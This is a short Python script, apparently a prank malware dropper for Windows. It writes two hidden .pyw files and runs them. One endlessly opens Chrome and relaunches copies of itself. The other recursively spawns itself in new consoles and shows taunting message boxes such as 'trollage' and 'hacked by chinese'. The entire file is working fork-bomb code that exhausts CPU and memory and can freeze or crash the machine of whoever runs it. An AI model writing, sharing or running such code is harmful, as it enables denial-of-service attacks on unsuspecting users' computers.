import subprocess


def main():
    f = open('chrome.pyw', 'w+')
    f.write('''import os
import subprocess


def open1():
    while True:
        os.system('start chrome')
        subprocess.call('python chrome.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
        subprocess.call('python chrome.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
        subprocess.call('python chrome.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)


open1()
''')

    f2 = open('YouveBeenChromed.pyw', 'w+')
    f2.write('''import subprocess
import ctypes
import random

possible_strings = ['You\\'ve been chromed!', 'hacked by chinese', 'onion owns you', 'es0t owns you']
message_box = ctypes.windll.user32.MessageBoxW


def getChromed():
    while True:
        subprocess.call('YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
        subprocess.call('YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
        subprocess.call('YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
        message_box(None, possible_strings[random.randint(0, len(possible_strings) - 1)], 'trollage', 0)


getChromed()
''')

    subprocess.call('chrome.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
    subprocess.call('YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)


if __name__ == '__main__':
    main()
